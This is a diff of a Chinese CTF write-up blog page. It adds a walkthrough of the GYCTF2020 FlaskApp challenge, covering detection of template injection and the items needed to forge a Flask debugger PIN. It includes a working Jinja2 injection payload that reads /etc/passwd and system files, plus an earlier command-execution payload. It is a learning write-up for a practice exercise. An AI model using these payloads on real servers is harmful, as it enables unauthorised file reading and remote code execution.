@@ -6,15 +6,47 @@
   <meta name="keywords" content=" buuctf ">
   <meta name="description" content="buuctf | Secfeng">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-<meta property="og:type" content="website">
-<meta property="og:title" content="about">
-<meta property="og:url" content="http://example.com/about/index.html">
+<meta name="description" content="misc1打开图片就能看到flag misc2打开压缩包有一个.txt文件，用文本模式看了一下没发现什么有用的消息，用010editor打开查看16进制，发现文件头是89 50 4E 47,这是png的文件头   所以把文件后缀改为.png，得到flag 还可以用python来提取图片中的文字 import pytesseract from PIL import Image image&#x3D;Image">
+<meta property="og:type" content="article">
+<meta property="og:title" content="misc(ctfshow)">
+<meta property="og:url" content="http://example.com/2023/11/02/misc(ctfshow)/index.html">
 <meta property="og:site_name" content="Secfeng">
+<meta property="og:description" content="misc1打开图片就能看到flag misc2打开压缩包有一个.txt文件，用文本模式看了一下没发现什么有用的消息，用010editor打开查看16进制，发现文件头是89 50 4E 47,这是png的文件头   所以把文件后缀改为.png，得到flag 还可以用python来提取图片中的文字 import pytesseract from PIL import Image image&#x3D;Image">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2023-03-05T11:53:12.000Z">
-<meta property="article:modified_time" content="2023-03-28T14:09:40.008Z">
+<meta property="og:image" content="http://example.com/2023/11/02/misc(ctfshow)/203313.png">
+<meta property="og:image" content="http://example.com/2023/11/02/misc(ctfshow)/234055.png">
+<meta property="og:image" content="http://example.com/2023/11/02/misc(ctfshow)/202139.png">
+<meta property="og:image" content="http://example.com/2023/11/02/misc(ctfshow)/203409.png">
+<meta property="og:image" content="http://example.com/2023/11/02/misc(ctfshow)/204502.png">
+<meta property="og:image" content="http://example.com/2023/11/02/misc(ctfshow)/212036.png">
+<meta property="og:image" content="http://example.com/2023/11/02/misc(ctfshow)/201505.png">
+<meta property="og:image" content="http://example.com/2023/11/02/misc(ctfshow)/204811.png">
+<meta property="og:image" content="http://example.com/2023/11/02/misc(ctfshow)/211026.png">
+<meta property="og:image" content="http://example.com/2023/11/02/misc(ctfshow)/212926.png">
+<meta property="og:image" content="http://example.com/2023/11/02/misc(ctfshow)/215958.png">
+<meta property="og:image" content="http://example.com/2023/11/02/misc(ctfshow)/220809.png">
+<meta property="og:image" content="http://example.com/2023/11/02/misc(ctfshow)/223956.png">
+<meta property="og:image" content="http://example.com/2023/11/02/misc(ctfshow)/214731.png">
+<meta property="og:image" content="http://example.com/2023/11/02/misc(ctfshow)/220032.png">
+<meta property="og:image" content="http://example.com/2023/11/02/misc(ctfshow)/222755.png">
+<meta property="og:image" content="http://example.com/2023/11/02/misc(ctfshow)/223220.png">
+<meta property="og:image" content="http://example.com/2023/11/02/misc(ctfshow)/202727.png">
+<meta property="og:image" content="http://example.com/2023/11/02/misc(ctfshow)/195035.png">
+<meta property="og:image" content="http://example.com/2023/11/02/misc(ctfshow)/202748.png">
+<meta property="og:image" content="http://example.com/2023/11/02/misc(ctfshow)/204243.png">
+<meta property="og:image" content="http://example.com/2023/11/02/misc(ctfshow)/215343.png">
+<meta property="og:image" content="http://example.com/2023/11/02/misc(ctfshow)/194733.png">
+<meta property="og:image" content="http://example.com/2023/11/02/misc(ctfshow)/200155.png">
+<meta property="og:image" content="http://example.com/2023/11/02/misc(ctfshow)/204647.png">
+<meta property="og:image" content="http://example.com/2023/11/02/misc(ctfshow)/213308.png">
+<meta property="og:image" content="http://example.com/2023/11/02/misc(ctfshow)/214624.png">
+<meta property="og:image" content="http://example.com/2023/11/02/misc(ctfshow)/223313.png">
+<meta property="article:published_time" content="2023-11-02T12:19:04.000Z">
+<meta property="article:modified_time" content="2023-11-17T15:00:13.337Z">
 <meta property="article:author" content="Secfeng">
+<meta property="article:tag" content="misc">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2023/11/02/misc(ctfshow)/203313.png">
 
 
 <link rel="icon" href="/img/avatar.jpg">
@@ -146,7 +178,7 @@
     </div>
 </div>
 <input type="hidden" id="yelog_site_posts_number" value="21">
-<input type="hidden" id="yelog_site_word_count" value="53.7k">
+<input type="hidden" id="yelog_site_word_count" value="54.9k">
 <div style="display: none">
     <span id="busuanzi_value_site_uv"></span>
     <span id="busuanzi_value_site_pv"></span>
@@ -486,12 +518,12 @@
     </div>
     <div class="article-meta">
         
-            发布时间 : <time class="date" title='最后更新: 2023-10-30 23:25:50'>2023-08-03 15:39</time>
+            发布时间 : <time class="date" title='最后更新: 2023-11-25 23:40:52'>2023-08-03 15:39</time>
         
     </div>
     <div class="article-meta">
         
-        <span>字数:12.1k</span>
+        <span>字数:13.2k</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -510,7 +542,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="toc-text">sql注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL"><span class="toc-text">[极客大挑战 2019]EasySQL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SUCTF-2019-EasySQL"><span class="toc-text">[SUCTF 2019]EasySQL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-LoveSQL"><span class="toc-text">[极客大挑战 2019]LoveSQL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BabySQL"><span class="toc-text">[极客大挑战 2019]BabySQL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GXYCTF2019-BabySQli"><span class="toc-text">[GXYCTF2019]BabySQli</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-HardSQL"><span class="toc-text">[极客大挑战 2019]HardSQL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8"><span class="toc-text">[强网杯 2019]随便注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GYCTF2020-Blacklist"><span class="toc-text">[GYCTF2020]Blacklist</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World"><span class="toc-text">[CISCN2019 华北赛区 Day2 Web1]Hack World</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-FinalSQL"><span class="toc-text">[极客大挑战 2019]FinalSQL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BJDCTF2020-Easy-MD5"><span class="toc-text">[BJDCTF2020]Easy MD5</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-rce"><span class="toc-text">命令执行(rce)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Exec"><span class="toc-text">[ACTF2020 新生赛]Exec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GXYCTF2019-Ping-Ping-Ping"><span class="toc-text">[GXYCTF2019]Ping Ping Ping</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Knife"><span class="toc-text">[极客大挑战 2019]Knife</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GXYCTF2019-%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83"><span class="toc-text">[GXYCTF2019]禁止套娃</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WUSTCTF2020-%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E"><span class="toc-text">[WUSTCTF2020]朴实无华</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-web"><span class="toc-text">[安洵杯 2019]easy_web</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#a-x3D-x3D-md5-a%EF%BC%89"><span class="toc-text">$a&#x3D;&#x3D;md5($a）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-Nmap"><span class="toc-text">[网鼎杯 2020 朱雀组]Nmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BJDCTF2020-EasySearch"><span class="toc-text">[BJDCTF2020]EasySearch</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME"><span class="toc-text">**[极客大挑战 2019]RCE ME</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-text">文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include"><span class="toc-text">[ACTF2020 新生赛]Include</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HCTF-2018-WarmUp"><span class="toc-text">[HCTF 2018]WarmUp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Secret-File"><span class="toc-text">[极客大挑战 2019]Secret File</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BSidesCF-2020-Had-a-bad-day"><span class="toc-text">[BSidesCF 2020]Had a bad day</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GWCTF-2019-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-text">[GWCTF 2019]我有一个数据库</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-text">文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Upload"><span class="toc-text">[极客大挑战 2019]Upload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload"><span class="toc-text">[ACTF2020 新生赛]Upload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GXYCTF2019-BabyUpload"><span class="toc-text">[GXYCTF2019]BabyUpload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MRCTF2020-%E4%BD%A0%E4%BC%A0%E4%BD%A0%F0%9F%90%8E%E5%91%A2"><span class="toc-text">[MRCTF2020]你传你🐎呢</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SUCTF-2019-CheckIn"><span class="toc-text">[SUCTF 2019]CheckIn</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BUUCTF-2018-Online-Tool"><span class="toc-text">[BUUCTF 2018]Online Tool</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">php反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP"><span class="toc-text">[极客大挑战 2019]PHP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-AreUSerialz"><span class="toc-text">[网鼎杯 2020 青龙组]AreUSerialz</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ZJCTF-2019-NiZhuanSiWei"><span class="toc-text">[ZJCTF 2019]NiZhuanSiWei</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-phpweb"><span class="toc-text">[网鼎杯 2020 朱雀组]phpweb</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MRCTF2020-Ezpop"><span class="toc-text">[MRCTF2020]Ezpop</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-serialize-php"><span class="toc-text">[安洵杯 2019]easy_serialize_php</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NPUCTF2020-ReadlezPHP"><span class="toc-text">[NPUCTF2020]ReadlezPHP</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#php%E7%89%B9%E6%80%A7"><span class="toc-text">php特性</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#BJDCTF2020-ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4"><span class="toc-text">[BJDCTF2020]ZJCTF，不过如此</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5"><span class="toc-text">SSTI模板注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A4%E7%BD%91%E6%9D%AF-2018-easy-tornado"><span class="toc-text">[护网杯 2018]easy_tornado</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BJDCTF2020-The-mystery-of-ip"><span class="toc-text">[BJDCTF2020]The mystery of ip</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BJDCTF2020-Cookie-is-so-stable"><span class="toc-text">[BJDCTF2020]Cookie is so stable</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WesternCTF2018-shrine"><span class="toc-text">[WesternCTF2018]shrine</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Web11"><span class="toc-text">[CISCN2019 华东南赛区]Web11</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B7%B7%E6%9D%82"><span class="toc-text">混杂</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#BJDCTF2020-Mark-loves-cat"><span class="toc-text">[BJDCTF2020]Mark loves cat</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MRCTF2020-PYWebsite"><span class="toc-text">[MRCTF2020]PYWebsite</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ASIS-2019-Unicorn-shop"><span class="toc-text">[ASIS 2019]Unicorn shop</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CISCN-2019-%E5%88%9D%E8%B5%9B-Love-Math"><span class="toc-text">[CISCN 2019 初赛]Love Math</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BSidesCF-2019-Kookie"><span class="toc-text">[BSidesCF 2019]Kookie</span></a></li></ol></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="toc-text">sql注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL"><span class="toc-text">[极客大挑战 2019]EasySQL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SUCTF-2019-EasySQL"><span class="toc-text">[SUCTF 2019]EasySQL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-LoveSQL"><span class="toc-text">[极客大挑战 2019]LoveSQL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BabySQL"><span class="toc-text">[极客大挑战 2019]BabySQL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GXYCTF2019-BabySQli"><span class="toc-text">[GXYCTF2019]BabySQli</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-HardSQL"><span class="toc-text">[极客大挑战 2019]HardSQL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8"><span class="toc-text">[强网杯 2019]随便注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GYCTF2020-Blacklist"><span class="toc-text">[GYCTF2020]Blacklist</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World"><span class="toc-text">[CISCN2019 华北赛区 Day2 Web1]Hack World</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-FinalSQL"><span class="toc-text">[极客大挑战 2019]FinalSQL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BJDCTF2020-Easy-MD5"><span class="toc-text">[BJDCTF2020]Easy MD5</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-rce"><span class="toc-text">命令执行(rce)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Exec"><span class="toc-text">[ACTF2020 新生赛]Exec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GXYCTF2019-Ping-Ping-Ping"><span class="toc-text">[GXYCTF2019]Ping Ping Ping</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Knife"><span class="toc-text">[极客大挑战 2019]Knife</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GXYCTF2019-%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83"><span class="toc-text">[GXYCTF2019]禁止套娃</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WUSTCTF2020-%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E"><span class="toc-text">[WUSTCTF2020]朴实无华</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-web"><span class="toc-text">[安洵杯 2019]easy_web</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#a-x3D-x3D-md5-a%EF%BC%89"><span class="toc-text">$a&#x3D;&#x3D;md5($a）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-Nmap"><span class="toc-text">[网鼎杯 2020 朱雀组]Nmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BJDCTF2020-EasySearch"><span class="toc-text">[BJDCTF2020]EasySearch</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME"><span class="toc-text">**[极客大挑战 2019]RCE ME</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-text">文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include"><span class="toc-text">[ACTF2020 新生赛]Include</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HCTF-2018-WarmUp"><span class="toc-text">[HCTF 2018]WarmUp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Secret-File"><span class="toc-text">[极客大挑战 2019]Secret File</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BSidesCF-2020-Had-a-bad-day"><span class="toc-text">[BSidesCF 2020]Had a bad day</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GWCTF-2019-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-text">[GWCTF 2019]我有一个数据库</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-text">文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Upload"><span class="toc-text">[极客大挑战 2019]Upload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload"><span class="toc-text">[ACTF2020 新生赛]Upload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GXYCTF2019-BabyUpload"><span class="toc-text">[GXYCTF2019]BabyUpload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MRCTF2020-%E4%BD%A0%E4%BC%A0%E4%BD%A0%F0%9F%90%8E%E5%91%A2"><span class="toc-text">[MRCTF2020]你传你🐎呢</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SUCTF-2019-CheckIn"><span class="toc-text">[SUCTF 2019]CheckIn</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BUUCTF-2018-Online-Tool"><span class="toc-text">[BUUCTF 2018]Online Tool</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">php反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP"><span class="toc-text">[极客大挑战 2019]PHP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-AreUSerialz"><span class="toc-text">[网鼎杯 2020 青龙组]AreUSerialz</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ZJCTF-2019-NiZhuanSiWei"><span class="toc-text">[ZJCTF 2019]NiZhuanSiWei</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-phpweb"><span class="toc-text">[网鼎杯 2020 朱雀组]phpweb</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MRCTF2020-Ezpop"><span class="toc-text">[MRCTF2020]Ezpop</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-serialize-php"><span class="toc-text">[安洵杯 2019]easy_serialize_php</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NPUCTF2020-ReadlezPHP"><span class="toc-text">[NPUCTF2020]ReadlezPHP</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#php%E7%89%B9%E6%80%A7"><span class="toc-text">php特性</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#BJDCTF2020-ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4"><span class="toc-text">[BJDCTF2020]ZJCTF，不过如此</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5"><span class="toc-text">SSTI模板注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A4%E7%BD%91%E6%9D%AF-2018-easy-tornado"><span class="toc-text">[护网杯 2018]easy_tornado</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BJDCTF2020-The-mystery-of-ip"><span class="toc-text">[BJDCTF2020]The mystery of ip</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BJDCTF2020-Cookie-is-so-stable"><span class="toc-text">[BJDCTF2020]Cookie is so stable</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WesternCTF2018-shrine"><span class="toc-text">[WesternCTF2018]shrine</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Web11"><span class="toc-text">[CISCN2019 华东南赛区]Web11</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GYCTF2020-FlaskApp"><span class="toc-text">[GYCTF2020]FlaskApp</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%A2%84%E6%9C%9F%E8%A7%A3-%E5%88%A9%E7%94%A8PIN%E7%A0%81%E8%BF%9B%E8%A1%8CRCE"><span class="toc-text">预期解 利用PIN码进行RCE</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F%E8%A7%A3"><span class="toc-text">非预期解</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B7%B7%E6%9D%82"><span class="toc-text">混杂</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#BJDCTF2020-Mark-loves-cat"><span class="toc-text">[BJDCTF2020]Mark loves cat</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MRCTF2020-PYWebsite"><span class="toc-text">[MRCTF2020]PYWebsite</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ASIS-2019-Unicorn-shop"><span class="toc-text">[ASIS 2019]Unicorn shop</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CISCN-2019-%E5%88%9D%E8%B5%9B-Love-Math"><span class="toc-text">[CISCN 2019 初赛]Love Math</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BSidesCF-2019-Kookie"><span class="toc-text">[BSidesCF 2019]Kookie</span></a></li></ol></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1613,6 +1645,98 @@ if __name__ == &#39;__main__&#39;:
 <img src="/2023/08/03/buuctf/210001.png" class="">
 
 <p>直接构造 {system(‘cat &#x2F;flag’)} 即可得到flag</p>
+<h3 id="GYCTF2020-FlaskApp"><a href="#GYCTF2020-FlaskApp" class="headerlink" title="[GYCTF2020]FlaskApp"></a>[GYCTF2020]FlaskApp</h3><p>题目提示是flask</p>
+<p>在加密内输入49 ，生成base64码e3s3Kjd9fcKg； 将e3s3Kjd9fcKg输入到解码框内，显示no no no说明存在防御</p>
+<p>换一个输入14，base64码为e3s3Kzd9fQ&#x3D;&#x3D;，解码后，显示的是14，因此存在ssti</p>
+<p>在解码页面随便输几个字符，看到报错信息，网站打开了flask的debug模式，在debug页面我们可以看到文件名，路径，源码和出错的方法名等信息</p>
+<img src="/2023/08/03/buuctf/202344.png" class="">
+
+<h5 id="预期解-利用PIN码进行RCE"><a href="#预期解-利用PIN码进行RCE" class="headerlink" title="预期解 利用PIN码进行RCE"></a>预期解 利用PIN码进行RCE</h5><p>经过测试，执行命令的ssti注入方法别过滤了，按照提示，应该想办法用pin码</p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/32336971">https://zhuanlan.zhihu.com/p/32336971</a></p>
+<p>pin码的生成需要下面这些东西：</p>
+<pre><code>1、服务器运行flask所登录的用户名。 通过读取/etc/passwd获得
+2、modname 一般不变就是flask.app
+3、getattr(app, “name”, app.class.name)。python该值一般为Flask
+值一般不变
+4、flask库下app.py的绝对路径。通过报错信息就会泄露该值。
+5、当前网络的mac地址的十进制数。通过文件/sys/class/net/eth0/address获得 //eth0处为当前使用的网卡
+6、最后一个就是机器的id。 对于非docker机每一个机器都会有自已唯一的id，linux的id一般存放在/etc/machine-id或/proc/sys/kernel/random/boot_i，有的系统没有这两个文件，windows的id获取跟linux也不同。对于docker机则读取/proc/self/cgroup：
+</code></pre>
+<p>先读登录的用户名</p>
+<pre><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('/etc/passwd','r').read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;
+</code></pre>
+<img src="/2023/08/03/buuctf/214252.png" class="">
+
+<p>其中的用户名是flaskweb</p>
+<p>我们用上面的payload稍加改动，将其中读文件的部分改成&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address，就可以读取机器的MAC地址了</p>
